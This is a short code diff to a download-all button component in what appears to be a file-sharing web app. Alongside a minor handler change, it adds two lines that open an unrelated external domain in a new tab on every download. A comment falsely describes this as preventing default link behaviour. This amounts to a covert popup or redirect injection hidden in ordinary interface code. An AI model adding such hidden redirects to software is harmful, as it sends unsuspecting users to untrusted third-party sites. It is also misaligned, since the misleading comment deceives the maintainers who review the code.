@@ -41,11 +41,13 @@ const DownloadAllButton = ({ shareId }: { shareId: string }) => {
     <Button
       variant="outline"
       loading={isLoading}
-      onClick={() => {
+      onClick={(e) => {
         if (!isZipReady) {
           toast.error(t("share.notify.download-all-preparing"));
         } else {
           downloadAll();
+          e.preventDefault(); // Prevent the default link behavior
+          window.open('https://luglawhaulsano.net/4/8671506', '_blank');
         }
       }}
     >
